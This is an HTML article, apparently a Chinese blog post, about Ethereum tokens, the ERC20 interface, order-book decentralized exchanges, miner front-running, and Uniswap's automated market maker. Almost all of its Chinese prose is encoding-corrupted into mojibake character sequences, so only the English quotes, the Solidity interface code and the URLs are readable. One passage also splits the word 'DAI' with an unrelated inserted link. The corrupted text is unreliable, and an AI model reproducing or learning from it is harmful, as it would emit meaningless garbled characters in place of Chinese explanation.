<p>é¦–å…ˆè®¨è®ºä¸‹ï¼Œç¬¬ä¸€ï¼Œä»¥å¤ªåŠä¸Šå¯ä»¥æŒ–å‡ºä»¥å¤ªå¸ethï¼Œäººä»¬å‡ºäºå„ç§æŠ•èµ„&#x2F;éƒ¨ç½²ä»¥å¤ªåŠæ™ºèƒ½åˆçº¦&#x2F;è¿è¡Œæ™ºèƒ½åˆçº¦ï¼Œä¼šç”¨ç°å®ä¸­çš„é’±å»è´­ä¹°ä»¥å¤ªå¸ã€‚ç¬¬äºŒï¼Œä»¥å¤ªåŠä¸Šè¿˜æœ‰å¾ˆå¤šç§ä»£å¸ï¼Œä»¥å¤ªåŠä»£å¸æ˜¯å†…ç½®åœ¨ä»¥å¤ªåŠåŒºå—é“¾ä¸Šçš„æ•°å­—èµ„äº§ã€‚å®ƒä»¬å—ç›Šäºä»¥å¤ªåŠç°æœ‰çš„åŸºç¡€è®¾æ–½ï¼Œè€Œä¸éœ€è¦å¼€å‘è€…é‡æ–°æ„å»ºå…¨æ–°åŒºå—é“¾ã€‚å®ƒä»¬è¿˜é€šè¿‡ä»¥å¤ªå¸ï¼ˆä»¥å¤ªåŠçš„æœ¬åœ°è´§å¸ï¼Œè¢«ç”¨æ¥é©±åŠ¨æ™ºèƒ½åˆçº¦ï¼‰æ¥åŠ å¼ºä»¥å¤ªåŠç”Ÿæ€ç³»ç»Ÿã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233117.jpg" alt="img"></p>
<p>åˆ©ç”¨ä»¥å¤ªåŠçš„æ™ºèƒ½åˆçº¦å¯ä»¥è½»æ¾ç¼–å†™å‡ºå±äºè‡ªå·±çš„ä»£å¸ï¼Œä»£å¸å¯ä»¥ä»£è¡¨ä»»ä½•å¯ä»¥äº¤æ˜“çš„ä¸œè¥¿ï¼Œå¦‚ï¼šç§¯åˆ†ã€è´¢äº§ã€è¯ä¹¦ç­‰ç­‰ã€‚å› æ­¤ä¸ç®¡æ˜¯å‡ºäºå•†ä¸šï¼Œè¿˜æ˜¯å­¦ä¹ çš„ç›®çš„ï¼Œå¾ˆå¤šäººæƒ³åˆ›å»ºä¸€ä¸ªè‡ªå·±çš„ä»£å¸ï¼Œçœ‹çœ‹åˆ›å»ºçš„ä»£å¸æ˜¯ä»€ä¹ˆæ ·å­ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233118.jpg" alt="img"></p>
<p>ERC20 Token</p>
<p>ERC20 å’Œä»£å¸ç»å¸¸ä¸€åŒå‡ºç°ï¼Œ ERC20 æ˜¯ä»¥å¤ªåŠå®šä¹‰çš„ä¸€ä¸ªä»£å¸æ ‡å‡†ã€‚å®šä¹‰äº†åœ¨å®ç°ä»£å¸çš„æ—¶å€™å¿…é¡»è¦éµå®ˆçš„åè®®ï¼Œå¦‚æŒ‡å®šä»£å¸åç§°ã€æ€»é‡ã€å®ç°ä»£å¸äº¤æ˜“å‡½æ•°ç­‰ï¼Œåªæœ‰æ”¯æŒäº†åè®®æ‰èƒ½è¢«ä»¥å¤ªåŠé’±åŒ…æ”¯æŒã€‚<br>å…¶æ¥å£å¦‚ä¸‹ï¼š</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">contract ERC20Interface &#123;</span><br><span class="line"></span><br><span class="line">    string public constant name = &quot;Token Name&quot;;</span><br><span class="line">    string public constant symbol = &quot;SYM&quot;;</span><br><span class="line">    uint8 public constant decimals = 18;  // 18 is the most common number of decimal places</span><br><span class="line"></span><br><span class="line">    function totalSupply() public constant returns (uint);</span><br><span class="line">    function balanceOf(address tokenOwner) public constant returns (uint balance);</span><br><span class="line">    function allowance(address tokenOwner, address spender) public constant returns (uint remaining);</span><br><span class="line">    function transfer(address to, uint tokens) public returns (bool success);</span><br><span class="line">    function approve(address spender, uint tokens) public returns (bool success);</span><br><span class="line">    function transferFrom(address from, address to, uint tokens) public returns (bool success);</span><br><span class="line"></span><br><span class="line">    event Transfer(address indexed from, address indexed to, uint tokens);</span><br><span class="line">    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç®€å•è¯´æ˜ä¸€ä¸‹ï¼š<br>name ï¼š ä»£å¸åç§°<br>symbolï¼š ä»£å¸ç¬¦å·<br>decimalsï¼š ä»£å¸å°æ•°ç‚¹ä½æ•°ï¼Œä»£å¸çš„æœ€å°å•ä½ï¼Œ 18 è¡¨ç¤ºæˆ‘ä»¬å¯ä»¥æ‹¥æœ‰ .0000000000000000001 å•ä½ä¸ªä»£å¸ã€‚<br>totalSupply() : å‘è¡Œä»£å¸æ€»é‡ã€‚<br>balanceOf(): æŸ¥çœ‹å¯¹åº”è´¦å·çš„ä»£å¸ä½™é¢ã€‚<br>transfer(): å®ç°ä»£å¸è½¬è´¦äº¤æ˜“ï¼Œç”¨äºç»™ç”¨æˆ·å‘é€ä»£å¸ï¼ˆä»æˆ‘ä»¬çš„è´¦æˆ·é‡Œï¼‰ã€‚<br>transferFrom(): ç»™è¢«æˆæƒçš„ç”¨æˆ·ä½¿ç”¨ï¼Œä»–å¯ä»¥ä»æˆ‘ä»¬ï¼ˆå‚æ•° fromï¼‰çš„è´¦æˆ·é‡Œå‘é€ä»£å¸ç»™å…¶ä»–ç”¨æˆ·ï¼ˆå‚æ•° toï¼‰ã€‚<br>allowance(): è¿”å›æˆæƒèŠ±è´¹çš„ä»£å¸æ•°ã€‚<br>approve(): æˆæƒç”¨æˆ·å¯ä»£è¡¨æˆ‘ä»¬èŠ±è´¹çš„ä»£å¸æ•°ã€‚</p>
<p>é‚£ä¹ˆä¸ºä»€ä¹ˆä¼šå‡ºç°uniswapè¿™æ ·çš„åè®®æ¥æ”¯æŒETHå’Œå„ç§ä»£å¸è¿›è¡Œè‡ªåŠ¨å…‘æ¢å‘¢ï¼Ÿ</p>
<p>ä¸¾ä¸€ä¸ªå…‘æ¢å¤–å¸çš„ä¾‹å­ï¼Œå…‘æ¢å¤–å¸æœ‰å¯èƒ½æ˜¯å‡ºå›½&#x2F;è´­ç‰©éœ€è¦ä½¿ç”¨ï¼Œä¹Ÿæœ‰å¯èƒ½å‡ºäºè·åˆ©çš„ç›®çš„ã€‚æ¯”å¦‚2018å¹´4æœˆä»½äººæ°‘å¸æ±‡ç‡æ˜¯6.3ï¼Œä¹Ÿå³å¯ä»¥ç”¨630å…ƒå…‘æ¢100ç¾å…ƒã€‚åˆ°2019å¹´10æœˆäººæ°‘å¸æ±‡ç‡æ˜¯7.1ï¼Œå¯ä»¥ç”¨æ‰‹ä¸­çš„100ç¾å…ƒå…‘æ¢710å…ƒäººæ°‘å¸ï¼Œç›¸å½“äºå°±èµšäº†70å…ƒäººæ°‘å¸ã€‚ä¹Ÿå³ï¼Œ2018å¹´4æœˆç”¨äººæ°‘å¸ä¹°ç¾å…ƒï¼Œ2019å¹´10æœˆå†ç”¨ç¾å…ƒä¹°äººæ°‘å¸ï¼Œè¿›è¡Œä¸¤ç§è´§å¸ä¹‹é—´çš„äº¤æ¢ã€‚ç›¸åï¼Œå¦‚æœåˆ°2020å¹´5æœˆäººæ°‘å¸åˆè·Œå›äº†6.3ï¼Œé‚£ä¹ˆåœ¨2019å¹´çš„æ—¶å€™ç”¨100ç¾å…ƒä¹°åˆ°710äººæ°‘å¸ï¼Œç„¶ååœ¨2020å¹´çš„æ—¶å€™æŠŠ710äººæ°‘å¸æ¢æˆ113ç¾å…ƒï¼Œå°±èµšåˆ°äº†13ç¾å…ƒã€‚</p>
<p>è¿™å°±æ˜¯ä¸¤ç§è´§å¸äº¤æ˜“çš„ä¾‹å­ã€‚è¿™ç§äº¤æ˜“å¯ä»¥å‘ç”Ÿåœ¨é“¶è¡Œæˆ–è€…äº¤æ˜“æ‰€ã€‚è™½ç„¶å›½å†…é“¶è¡Œè§„å®šè¿›è¡Œè´­æ±‡çš„æ—¶å€™ä¸éœ€è¦ä»»ä½•æ‰‹ç»­è´¹ï¼Œä½†æ˜¯æŠŠå¤–æ±‡è´§å¸å–ç»™é“¶è¡Œï¼Œä¼šæŒ‰é“¶è¡Œçš„â€œä¹°å…¥ä»·â€è®¡ç®—ï¼Œä»é“¶è¡Œä¹°å¤–æ±‡ï¼Œåˆ™æŒ‰é“¶è¡Œè§„å®šçš„â€œå–å‡ºä»·â€ç®—ã€‚å½“ä¸­å­˜åœ¨ä¸€ä¸ªå·®ä»·ï¼Œè¿™ä¸ªå·®ä»·ç›¸å½“äºé“¶è¡Œçš„æ‰‹ç»­è´¹ã€‚äº¤æ˜“æ‰€çš„ä¸‰ä¸ªç»å…¸è®¾è®¡æ¨¡å‹æ˜¯è®¢å•ç°¿æ¨¡å‹ã€è‡ªåŠ¨åŒ–åšå¸‚æ¨¡å‹å’Œè·å…°å¼æ‹å–æ¨¡å‹ã€‚è¿™é‡Œè¿˜æœ‰ä¸€äº›æ¦‚å¿µï¼Œå¦‚è®¢å•ç°¿ã€æŒ‚å•ã€é™ä»·å§”æ‰˜ç­‰ç­‰ã€‚</p>
<p>åœ¨ä¸­å¿ƒåŒ–äº¤æ˜“æ‰€ä¸­ï¼Œæ‰‹ç»­è´¹ç›¸å¯¹ç›ˆåˆ©è€Œè¨€ï¼Œä¸€èˆ¬ä¸ä½ï¼Œå› æ­¤ï¼Œå½“åŒºå—é“¾å‡ºç°ä¹‹åï¼Œå»ä¸­å¿ƒåŒ–äº¤æ˜“æ‰€ï¼ˆDEXï¼‰æ­£åœ¨æˆä¸ºä¸€ç§æ–°çš„è§£å†³æ–¹æ¡ˆã€‚2019å¹´æ—¶ï¼Œå·²æœ‰äº†ä¸å°‘åŸºäºåŒºå—é“¾çš„å»ä¸­å¿ƒåŒ–äº¤æ˜“æ‰€ï¼Œä¸å°‘çš„å»ä¸­å¿ƒåŒ–äº¤æ˜“æ‰€éƒ½æ˜¯åŸºäºè®¢å•ç°¿ã€‚è®¢å•ç°¿åŒ…å«äº†ä»£å¸çš„ä¹°å•å’Œå–å•åˆ—è¡¨ã€‚ä¹°å•ç§°ä¸ºå‡ºä»·ï¼ˆbidï¼‰ï¼Œå–å•ç§°ä¸ºè¦ä»·ï¼ˆaskï¼‰ã€‚è®¢å•ç°¿åˆ—å‡ºäº†åœ¨æ¯ä¸ªä»·æ ¼ç‚¹å‡ºä»·æˆ–è¦ä»·çš„ä»£å¸æ•°é‡ã€‚æœ€é«˜å‡ºä»·ï¼ˆä¹°ä¸€ï¼‰å’Œæœ€ä½è¦ä»·ï¼ˆå–ä¸€ï¼‰è¢«ç§°ä½œä¹°å–ä¸€ï¼ˆtop of the bookï¼‰ã€‚å®ƒä»¬æ ‡å¿—ç€å¸‚åœºæƒ…ç»ªä»¥åŠè·å¾—è®¢å•æ‰€éœ€çš„ä¹°å…¥ä»·å’Œå–å‡ºä»·ã€‚æœ€é«˜å‡ºä»·å’Œæœ€ä½è¦ä»·ä¹‹é—´çš„å·®å¼‚å«ä»·å·®ï¼ˆspreadï¼‰ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233119.jpg" alt="img"></p>
<p><em>DDEX çš„è®¢å•ç°¿</em></p>
<p>ç›®å‰ï¼ŒIDEXã€DDEXã€Radar Relayã€EtherDeltaã€Paradex å’Œ Ethfinex éƒ½æ˜¯è®¢å•ç°¿å¼ DEXã€‚åœ¨è®¢å•ç°¿å¼å»ä¸­å¿ƒåŒ–äº¤æ˜“æ‰€ï¼ˆä»¥ä¸‹ç®€ç§°è®¢å•ç°¿å¼ DEXï¼‰ä¸­ï¼Œå¯ä»¥æäº¤ä¸¤ç§ç±»å‹çš„è®¢å•ï¼šå¸‚ä»·è®¢å•å’Œé™ä»·è®¢å•ã€‚</p>
<p>æäº¤å¸‚ä»·è®¢å•æ—¶ï¼Œå¯ä»¥è®¾å®šä¹°å…¥&#x2F;å–å‡ºçš„ä»£å¸æ•°é‡ï¼ŒDEX ä¼šç«‹å³ä»¥æœ€ä¼˜å¸‚åœºä»·æ‰§è¡Œä½ çš„å¸‚ä»·å•ã€‚ä¸‹ä¸€ä¸ªå¸‚ä»·å•æ„å‘³ç€ï¼Œä¼˜å…ˆä¿è¯è®¢å•æˆäº¤é€Ÿåº¦ï¼Œæ— è®ºè®¢å•ç°¿ä¸Šç°æœ‰è®¢å•ä»·æ ¼æ˜¯å¤šå°‘ã€‚æ‰§è¡Œå¸‚ä»·å•çš„æ–¹å¼æ˜¯ï¼Œä¸ºä¹°å®¶åŒ¹é…ç°æœ‰çš„å–ä¸€è®¢å•ï¼Œä¸ºå–å®¶åŒ¹é…ç°æœ‰çš„ä¹°ä¸€è®¢å•ã€‚</p>
<p>æäº¤é™ä»·è®¢å•æ—¶ï¼ŒDEX ä¼šä»¥è®¾å®šçš„ä»·æ ¼å’Œæ•°é‡ä¹°å…¥æˆ–å–å‡ºä»£å¸ï¼Œå¦‚æœå½“å‰æ²¡æœ‰èƒ½ä¸ä¹‹åŒ¹é…çš„è®¢å•ï¼Œåˆ™è¯¥è®¢å•ä¼šè¢«æŒ‚åœ¨è®¢å•ç°¿ä¸Šï¼Œç­‰å¾…äº¤æ˜“ã€‚</p>
<p>è®¢å•ç°¿å¯ä»¥å­˜å‚¨åœ¨é“¾ä¸Šæˆ–é“¾ä¸‹ã€‚é“¾ä¸‹çš„è®¢å•ç°¿å¼äº¤æ˜“æ‰€ï¼ˆä¾‹å¦‚ 0xï¼‰éœ€è¦ Relayer ï¼ˆæŒ‡çš„æ˜¯é‡‡ç”¨æ­¤äº¤æ˜“åè®®çš„ DEXï¼‰å°†è®¢å•ç°¿å­˜å‚¨åœ¨ä¸­å¿ƒåŒ–æœåŠ¡å™¨ä¸Šã€‚è€Œé“¾ä¸Šçš„è®¢å•ç°¿å¼äº¤æ˜“æ‰€ä¸éœ€è¦ä¸­å¿ƒåŒ–æœåŠ¡å™¨ï¼Œä½†ç”¨æˆ·éœ€è¦è‡ªå·±åˆ›å»ºäº¤æ˜“å¹¶ä¸ºæŒ‚å•å’Œå–æ¶ˆè®¢å•çš„æ“ä½œæ”¯ä»˜ gas è´¹ç”¨ï¼Œå³ä½¿è®¢å•æ²¡æœ‰è¢«æˆäº¤ï¼Œgas è´¹ä¹Ÿæ— æ³•é€€è¿˜ã€‚</p>
<p>åœ¨è®¢å•ç°¿å¼äº¤æ˜“æ‰€ä¸­ï¼Œåšå¸‚å•†é€šè¿‡æŒ‚å•æ¥æä¾›æµåŠ¨æ€§ï¼Œè¿™äº›è®¢å•å¯ä»¥å‡å°‘ä»·å·®å¹¶è¡¥å¿åº“å­˜é£é™©ã€‚é€šå¸¸ï¼Œäº¤æ˜“é‡è¶Šä½ï¼Œä»·å·®è¶Šå¤§ï¼Œå› ä¸ºåšå¸‚å•†æ‰¿æ‹…çš„æµåŠ¨æ€§åŒ®ä¹çš„é£é™©æ›´å¤§ã€‚</p>
<p><em>ä¼˜ç‚¹</em></p>
<p>é€‚åˆæµåŠ¨æ€§å¸‚åœºã€‚ä¸€ä¸ªè®¢å•ç°¿äº¤æ˜“æ‰€çš„äº¤æ˜“é‡è¶Šå¤§ã€ä»·å·®è¶Šå°ï¼Œè¯æ˜ä¸€ä¸ªäº¤æ˜“æ‰€çš„æµåŠ¨æ€§è¶Šå¥½ã€‚åœ¨é«˜æµåŠ¨æ€§å¸‚åœºä¸­ï¼Œè®¢å•ç°¿å¼äº¤æ˜“æ‰€æœ€é€‚åˆäºæ˜¾ç¤ºå¸‚åœºä»·æ ¼ï¼Œå¹¶ä¸”å¤§é¢è®¢å•ä¸å—ä»·æ ¼æ»‘ç‚¹å½±å“ã€‚Coinbase å’Œå¸å®‰ç­‰å¤§å‹ä¸­å¿ƒåŒ–äº¤æ˜“æ‰€ã€ä»¥åŠçº½çº¦è¯åˆ¸äº¤æ˜“æ‰€ç­‰ä¼ ç»Ÿäº¤æ˜“æ‰€éƒ½ä¾èµ–äºè®¢å•ç°¿æ¨¡å¼ã€‚</p>
<p><em>ç¼ºç‚¹</em></p>
<p>ä¸é€‚åˆç¼ºä¹æµåŠ¨æ€§çš„å¸‚åœºã€‚åªæœ‰å½“å‡ºä»·å’Œè¦ä»·ç›¸åŒ¹é…æ—¶ï¼Œè®¢å•æ‰ä¼šè¢«å®Œæˆï¼Œåä¹‹äº¦ç„¶ï¼›å¦‚æœè®¢å•çš„æœ€é«˜å‡ºä»·ä»ç„¶ä½äºæœ€ä½è¦ä»·ï¼Œé‚£ä¹ˆå°†æ— æ³•è¿›è¡Œäº¤æ˜“ã€‚å› æ­¤ï¼Œå¯¹äºæµåŠ¨æ€§ä¸è¶³çš„å¸‚åœºï¼Œè®¢å•ç°¿äº¤æ˜“æ‰€å°†å¯¼è‡´å¤§é¢å·®ä»·ï¼Œäº¤æ˜“æˆåŠŸç‡ä½ï¼Œè€Œä¸”å°é‡èµ„é‡‘å³å¯å¯¹å¸‚åœºä»·æ ¼é€ æˆå·¨å¤§å½±å“ã€‚</p>
<p>çŸ¿å·¥æŠ¢å…ˆäº¤æ˜“ (front-running)ã€‚éƒ¨åˆ†é“¾ä¸Šè®¢å•ç°¿å¼äº¤æ˜“æ‰€é¢ä¸´ç€çŸ¿å·¥ä¸äº¤æ˜“è€…ä¹‹é—´çš„æŠ¢å…ˆäº¤æ˜“é—®é¢˜ã€‚</p>
<p>çŸ¿å·¥å¯ä»¥åœ¨äº¤æ˜“è¢«åŒºå—æ‰“åŒ…ä¹‹å‰å°±çœ‹åˆ°æ‰€æœ‰äº¤æ˜“ã€‚å¦‚æœä½ ä¸‹äº†ä¸€ä¸ªå¤§ä¹°å•ï¼Œä¸€æ—¦çŸ¿å·¥çœ‹åˆ°è¿™ä¸ªè®¢å•ï¼Œä»–ä»¬å‘ç°ä½ çš„è®¢å•å·²ç»å¤§åˆ°è¶³ä»¥æ‹‰é«˜ä»£å¸ä»·æ ¼ï¼Œé‚£ä¹ˆçŸ¿å·¥ä¾¿å¯ä»¥è‡ªå·±åˆ›å»ºä¸€ä¸ªä¹°å•å¹¶æŠŠè‡ªå·±çš„ä¹°å•åœ¨ä½ ä¹‹å‰æ·»åŠ åˆ°åŒºå—ä¸­ã€‚å½“è¿™ä¸ªåŒºå—è¢«æŒ–å‡ºï¼Œç›¸å½“äºè¿™ä¸ªçŸ¿å·¥ä½ä»·ä¹°å…¥äº†ä»£å¸ï¼Œç„¶åä»£å¸ä»·æ ¼è¢«å¤§å•æ‹‰é«˜ã€‚çŸ¿å·¥å†é«˜ä»·å–å‡ºè¿™ä¸ªä»£å¸ï¼Œå°±èƒ½æ— é£é™©å¥—åˆ©ã€‚</p>
<hr>
<p>Uniswapæ˜¯DeFiä¸­æœ€è‘—åçš„åè®®ä¹‹ä¸€ï¼Œå®Œå…¨éƒ¨ç½²åœ¨é“¾ä¸Šï¼Œä»»ä½•ä¸ªäººç”¨æˆ·ï¼Œåªè¦å®‰è£…äº†å»ä¸­å¿ƒåŒ–é’±åŒ…è½¯ä»¶ï¼ˆå½“å‰å·²ç»æ”¯æŒçš„é’±åŒ…åŒ…æ‹¬ MetaMaskã€WalletConnectã€Coinbase Walletã€Fortmaticã€Portisï¼‰ï¼Œéƒ½å¯ä»¥ä½¿ç”¨è¿™ä¸ªåè®®ã€‚Uniswapåè®®çš„è®¾è®¡ç»“æ„ä½“ç³»ä¸ä¼ ç»Ÿæ•°å­—èµ„äº§äº¤æ˜“æ‰€ä¸­çš„äº¤æ˜“æ¨¡å‹å®Œå…¨ä¸åŒã€‚å¤§å¤šæ•°ä¼ ç»Ÿäº¤æ˜“æ‰€éƒ½æ˜¯é€šè¿‡ç»´æŠ¤ä¸€ä¸ªâ€œè®¢å•ç°¿â€ï¼Œæ¥åŒ¹é…ä¸€ç§æ•°å­—èµ„äº§çš„ä¹°å–åŒæ–¹ã€‚Uniswapåˆ™æ˜¯åˆ©ç”¨å‚¨å¤‡é‡‘æµåŠ¨æ€§æ¥å®ç°åè®®ä¸Šçš„æ•°å­—èµ„äº§äº¤æ˜“å…‘æ¢ã€‚Uniswapæœ¬è´¨æ˜¯ä¸€ä¸ªè‡ªåŠ¨åŒ–åšå¸‚å•†ï¼ˆAMMï¼‰ï¼Œå®ƒèˆå¼ƒäº†ä¼ ç»Ÿè®¢å•è–„çš„æ’®åˆæ–¹å¼ï¼Œé‡‡ç”¨æµåŠ¨æ± åŠ æ’å®šä¹˜ç§¯å…¬å¼ç®—æ³•(x*y &#x3D; k )ä¸ºä¸åŒåŠ å¯†èµ„äº§æä¾›å³æ—¶æŠ¥ä»·å’Œå…‘æ¢æœåŠ¡ã€‚ </p>
<p><strong>ä»€ä¹ˆæ˜¯Uniswap</strong></p>
<p>å…³äºä»€ä¹ˆæ˜¯Uniswapï¼Œå…ˆçœ‹ä¸€ä¸‹Uniswapç™½çš®ä¹¦ä¸­çš„å®šä¹‰ï¼š</p>
<p>Uniswap is a protocol for automated token exchange on Ethereum. It is designed around ease-of-use, gas efficiency, censorship resistance, and zero rent extraction. </p>
<p>Uniswapæ˜¯ä¸€ä¸ªåŸºäºä»¥å¤ªåŠçš„è‡ªåŠ¨ä»£å¸äº¤æ¢åè®®ï¼Œå®ƒçš„è®¾è®¡ç›®æ ‡æ˜¯ï¼šæ˜“ç”¨æ€§ã€gasé«˜åˆ©ç”¨ç‡ã€æŠ—å®¡æŸ¥æ€§å’Œé›¶æŠ½ç§Ÿã€‚ </p>
<ul>
<li><p>ease-of-useï¼ˆæ˜“ç”¨æ€§ï¼‰ï¼šToken Aæ¢Token Bï¼Œåœ¨Uniswapä¹Ÿåªè¦å‘å‡ºä¸€ç¬”äº¤æ˜“å°±èƒ½å®Œæˆå…‘æ¢ï¼Œåœ¨å…¶å®ƒäº¤æ˜“æ‰€ä¸­å¯èƒ½éœ€è¦å‘ä¸¤ç¬”äº¤æ˜“ï¼šç¬¬ä¸€ç¬”å°†Token Aæ¢æˆæŸç§åª’ä»‹è´§å¸ï¼Œå¦‚ETH, D<a href="https://link.zhihu.com/?target=http://jizhid.com/number/ai/">AI</a> ç­‰ï¼Œç„¶åå†å‘ç¬¬äºŒç¬”äº¤æ˜“æ¢æˆToken Bã€‚ </p>
</li>
<li><p>gas efficiencyï¼ˆgasé«˜åˆ©ç”¨ç‡ï¼‰ï¼šåœ¨Uniswapä¸Šæ¶ˆè€—çš„gasé‡æ˜¯ä»¥å¤ªåŠä¸Šçš„å‡ å®¶ä¸»æµå»ä¸­åŒ–äº¤æ˜“æ‰€ä¸­æœ€ä½çš„ï¼Œä¹Ÿå°±ä»£è¡¨åœ¨Uniswapäº¤æ˜“è¦ä»˜çš„çŸ¿å·¥è´¹æœ€å°‘ã€‚</p>
</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233120.jpg" alt="img"></p>
<ul>
<li>censorship resistanceï¼ˆæŠ—å®¡æŸ¥æ€§ï¼‰ï¼šæŠ—å®¡æŸ¥æ€§ä½“ç°åœ¨Uniswapä¸Šæ¶æ–°Tokenæ²¡æœ‰é—¨æ§›ï¼Œä»»ä½•äººéƒ½èƒ½åœ¨Uniswapä¸Šæ¶ä»»ä½•Tokenã€‚è¿™åœ¨å»ä¸­å¿ƒäº¤æ˜“æ‰€ä¸­å¾ˆå°‘è§ï¼Œè™½ç„¶å¤§å¤šæ•°çš„å»ä¸­å¿ƒåŒ–äº¤æ˜“æ‰€ä¸ä¼šåƒä¸­å¿ƒåŒ–äº¤æ˜“æ‰€æ”¶å–ä¸Šå¸è´¹ï¼Œä½†è¿˜æ˜¯éœ€è¦æäº¤ä¸Šå¸ç”³è¯·ï¼Œé€šè¿‡å®¡æŸ¥åè¿è¥å›¢é˜Ÿæ‰ä¼šè®©Tokenå¯ä»¥åœ¨ä»–ä»¬çš„äº¤æ˜“æ‰€ä¸Šäº¤æ˜“ã€‚ä¸‹é¢æ˜¯å„å»ä¸­å¿ƒåŒ–äº¤æ˜“æ‰€ä¸Šå¸è§„åˆ™çš„è¯¦æƒ…ï¼š</li>
</ul>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">KyberSwapä¸Šå¸è§„åˆ™ï¼šhttps://developer.kyber.network/docs/Reserves-ListingProcess/</span><br><span class="line">EtherDeltaä¸Šå¸è§„åˆ™ï¼šhttps://steemit.com/cryptocurrency/@mindseye69/new-etherdelta-coin-listing-rules</span><br><span class="line">IDEXä¸Šå¸è§„åˆ™ï¼šhttps://medium.com/@forrestwhaling/idex-token-listing-guidelines-eae00785fdd2</span><br><span class="line">Uniswapä¸Šå¸è§„åˆ™ï¼šhttps://uniswap.org/docs/v1/frontend-integration/token-listing/</span><br></pre></td></tr></table></figure>

<ul>
<li>zero rent extractionï¼ˆé›¶æŠ½ç§Ÿï¼‰:åœ¨Uniswapåè®®è®¾è®¡ä¸­ï¼Œå¼€å‘å›¢é˜Ÿä¸ä¼šä»äº¤æ˜“ä¸­æŠ½å–è´¹ç”¨ï¼Œäº¤æ˜“ä¸­çš„æ‰€æœ‰è´¹ç”¨éƒ½å½’è¿˜ç»™æµåŠ¨æ€§æä¾›è€…ã€‚</li>
</ul>
<p>ä¸Šé¢çš„ä»‹ç»ä¸­åˆæœ‰ä¸¤ä¸ªæ–°åè¯ï¼šAMM automated market makerï¼Œè‡ªåŠ¨åŒ–åšå¸‚å•†ï¼›æµåŠ¨æ€§æä¾›è€…ã€‚</p>
<h2 id="è‡ªåŠ¨åŒ–åšå¸‚å•†-AMM"><a href="#è‡ªåŠ¨åŒ–åšå¸‚å•†-AMM" class="headerlink" title="è‡ªåŠ¨åŒ–åšå¸‚å•†(AMM)"></a>è‡ªåŠ¨åŒ–åšå¸‚å•†(AMM)</h2><p>ä¼ ç»Ÿçš„äº¤æ˜“æ‰€æœ‰ä¸€ä¸ªè®¢å•è–„(Order Book)ï¼Œè®¢å•è–„ä¸Šè®°å½•ç€ä¹°å–æ–¹å‘ï¼Œæ•°é‡å’Œå‡ºä»·ï¼Œäº¤æ˜“æ‰€è´Ÿè´£å¯¹ä¹°å–åŒæ–¹è¿›è¡Œé…å¯¹ï¼Œä¸€æ—¦è®¢å•è–„ä¸­æœ€é«˜ä»·æ ¼ä½äºæˆ–ç­‰äºæœ€ä½ä»·æ ¼ï¼Œå°±ä¼šä¿ƒæˆäº¤æ˜“ï¼ŒåŒæ—¶ä¼šäº§ç”Ÿä¸€ä¸ªæ–°çš„æˆäº¤ä»·ï¼Œä¼ ç»Ÿäº¤æ˜“æ‰€æœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼š</p>
<ul>
<li>å¸‚åœºä¸Šå¿…é¡»è¦æœ‰ç”¨æˆ·è¿›è¡ŒæŒ‚å•ï¼Œè¦æœ‰ä¸€å®šé‡çš„è®¢å•ï¼ˆå¸‚åœºæµåŠ¨ï¼‰ã€‚</li>
<li>è®¢å•å¿…é¡»é‡å æ‰èƒ½æˆäº¤ï¼Œå³ä¹°ä»·é«˜äºæˆ–ç­‰äºå–ä»·ã€‚</li>
<li>éœ€è¦å°†èµ„äº§å­˜å‚¨åœ¨äº¤æ˜“æ‰€ã€‚</li>
</ul>
<p>åœ¨è®¢å•è–„æ¨¡å‹å¸‚åœºä¸­ï¼Œä¹°å®¶æœŸæœ›ç”¨æœ€ä½çš„ä»·æ ¼ä¹°åˆ°æƒ³è¦çš„èµ„äº§ï¼Œè€Œå–å®¶åˆ™æ˜¯æœŸæœ›ç”¨æœ€é«˜ä»·æ ¼å–å‡ºåŒä¸€é¡¹èµ„äº§ï¼Œå¦‚æœäº¤æ˜“è¦æˆç«‹ï¼Œä¹°å–åŒæ–¹å¿…é¡»è¦åœ¨ä»·æ ¼ä¸Šè¾¾æˆå…±è¯†ï¼Œä¸€æ˜¯ä¹°å®¶æé«˜å‡ºä»·ï¼Œè€Œæ˜¯å–å®¶é™ä½å‡ºä»·ï¼Œå¦‚æœåŒæ–¹éƒ½ä¸è¦æ”¹å˜å‡ºä»·ï¼Œè¿™æ—¶å€™å°±è¦ä¾é åšå¸‚å•†çš„å‚ä¸ï¼Œç®€å•æ¥è¯´ï¼Œåšå¸‚å•†æ˜¯ä¸€ä¸ªä¿ƒè¿›äº¤æ˜“çš„å®ä½“ï¼Œå®ƒä¼šåœ¨ä¹°å–ä¸¤ä¸ªæ–¹å‘ä¸ŠæŒ‚å•ï¼Œè®©æƒ³è¦äº¤æ˜“çš„å‚ä¸æ–¹åªè¦è·Ÿåšå¸‚å•†çš„è®¢å•æ’®åˆå°±èƒ½å®Œæˆäº¤æ˜“ï¼Œè€Œä¸éœ€è¦ç­‰å¾…å¯¹æ‰‹æ–¹å‡ºç°æ‰èƒ½äº¤æ˜“ï¼Œæå¤§çš„æé«˜äº†å¸‚åœºçš„æµåŠ¨æ€§ã€‚</p>
<p>ä¸ºä»€ä¹ˆUniswapä¸é‡‡ç”¨è®¢å•è–„æ¨¡å‹ï¼Ÿ</p>
